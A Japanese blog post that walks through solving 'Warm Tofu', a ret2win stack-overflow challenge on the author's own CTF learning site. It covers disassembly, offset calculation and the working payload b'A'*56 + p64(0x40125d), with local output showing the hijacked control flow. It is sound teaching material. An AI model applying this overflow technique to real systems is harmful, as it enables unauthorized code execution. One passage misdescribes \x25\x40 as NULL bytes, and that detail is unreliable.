---
title: "TofuCTF Warm Tofuで学ぶret2win入門：スタックオーバーフローで隠し関数を呼ぶまで"
emoji: "🍢"
type: "tech"
topics: [ctf, pwn, security, x86, 学習]
published: true
---

こんにちは、豆腐たそです。自作pwn学習サイト「TofuCTF」の1問目「Warm Tofu」（ret2win入門）について、オフセット特定からローカル検証までを解説します。前回の整数切り詰め記事に続き、日次pwn学習の記録です。

## 問題の構成

配布物はELFバイナリ1つ（stripped）と`Dockerfile`、`run.sh`。問題文のヒントは「小さな豆腐屋の注文受付には、少し大きすぎる注文を断れない癖がある。隠された厨房への道を探そう」。

バイナリの保護は次の通りです（`readelf`で確認）。

- **NX有効**（`GNU_STACK`が`RW`）
- **No PIE**（ロードアドレスが`0x400000`番台固定）
- **Partial RELRO**（`GNU_RELRO`あり、`BIND_NOW`なし）

`file`では`ELF 64-bit LSB executable`（PIEではない`executable`）と表示され、strippedなのでシンボルはほぼありません。

## リバースエンジニアリング

`objdump -d`で`.text`を読むと、strippedでも構造は素直に読めます。

### secret_kitchenに相当する関数（0x40125d）

```asm
40125d: endbr64
401261: push   %rbp
401265: sub    $0x90,%rsp
40126c: lea    0xd95(%rip),%rax        # "/flag"
401276: lea    0xd8d(%rip),%rax        # "r"
401280: call   401110 <fopen@plt>
        ...
40130f: cmpq   $0x0,-0x8(%rbp)         ; fopen失敗チェック
401316: lea    ...,"The kitchen is empty."
40132a: call   401120 <exit@plt>
40132f: mov    -0x8(%rbp),%rdx
401333: lea    -0x90(%rbp),%rax
40133a: mov    $0x80,%esi              ; 128バイト
401342: call   4010f0 <fgets@plt>
        ...
40136c: call   4010b0 <puts@plt>       ; 読んだ文字列を出力
401376: call   401120 <exit@plt>
```

`/flag`を`fopen`して`fgets`で読み、`puts`で表示して即`exit(0)`する、典型的なwin関数です。

### 入力受付関数（0x40137b）

```asm
401383: sub    $0x30,%rsp              ; ローカル48バイト
4013aa: lea    -0x30(%rbp),%rax        ; バッファはrbp-0x30
4013ae: mov    $0xa0,%edx              ; 読み込みは160バイト
4013bb: call   4010e0 <read@plt>
```

48バイトのバッファに`read`で160バイト読み込む——これが「大きすぎる注文を断れない」癖の正体で、112バイト分の上書きが可能です。

### main（0x4013d2）

`setup()` → バナー表示 → 入力受付関数を呼んで`return 0`。win関数はどこからも呼ばれていないので、リターンアドレスを書き換えて飛ばすしかありません。

## オフセットの特定

保存済みリターンアドレスまでの距離を計算します。

- バッファ先端から`rbp`まで: `0x30` = 48バイト
- 保存済み`rbp`: 8バイト
- 合計: **56バイト**

ペイロードは`b'A'*56 + p64(0x40125d)`。`read`はNULLバイトもそのまま送れるので、アドレス中の`\x25\x40`のようなNULLを気にする必要がなく、`printf`系のフォーマット文字列問題と違って単純です。

## ローカル検証

実際に手元のバイナリで動作を確認しました。

通常入力（`hi`）ではバナー表示後に正常終了:

```text
=== Warm Tofu ===
How would you like your tofu?
> Order received. Please wait...
```

`b'A'*56 + p64(0x40125d)`を送ると:

```text
The kitchen is empty.
```

この表示はwin関数内部の`fopen("/flag")`失敗パスのメッセージです。つまり**リターンアドレスの書き換えが成功し、実際に`0x40125d`へ制御が移った**ことまで検証できます。コンテナ外では`/flag`が存在しないためここで止まりますが、制御移行の確認としては十分です。

実際のフラグ取得は`Dockerfile`の通り`/secrets/flag`へのシンボリックリンク`/flag`が配置されたコンテナ内で行います。エントリポイントは`socat`の`EXEC:`起動なので、`nc 127.0.0.1 31337`に対して同じペイロードを送れば同じ経路でflagが表示されます。

## 補足: NX環境での落とし穴

NX有効・No PIEという構成は「シェルコード注入は不可、既存コードへの制御移行ならアドレスが固定で書ける」ことを意味します。ret2winはこの条件の最短解です。

1つ注意点として、`sub $0x30,%rsp`した直後に`read`→`leave; ret`という構造では、スタックアライメント（x86-64の`movaps`要件）が問題になるケースがあります。今回はwin関数が`printf`/`puts`/`fgets`/`fclose`しか呼ばず問題になりませんでしたが、`system`などSSE命令を使う関数へ飛ばす場合は`ret`ガジェットを1つ挟む対処が定番です。

## 学び

- strippedバイナリでも`objdump`でPLT呼び出しと文字列参照を追えば、win関数の特定は機械的にできる
- バッファサイズと`read`サイズの差分、および`lea -0x30(%rbp)`のようなローカル変数参照からオフセットを正確に算出する
- `read`はNULLバイトを透過させるため、No PIEの固定アドレスへの飛び越しに都合がよい
- コンテナ外でもwin関数の「失敗パス」到達で制御移行を検証できる。flagファイルの代わりに失敗メッセージがシグナルになる

## 参考資料

- [TofuCTF（自作pwn学習サイト）](https://tasodoufu.github.io/TofuCTF/)
- [pwn.college - Binary Exploitation](https://pwn.college/software-exploitation/binary-exploitation/)（ret2win系の基礎）
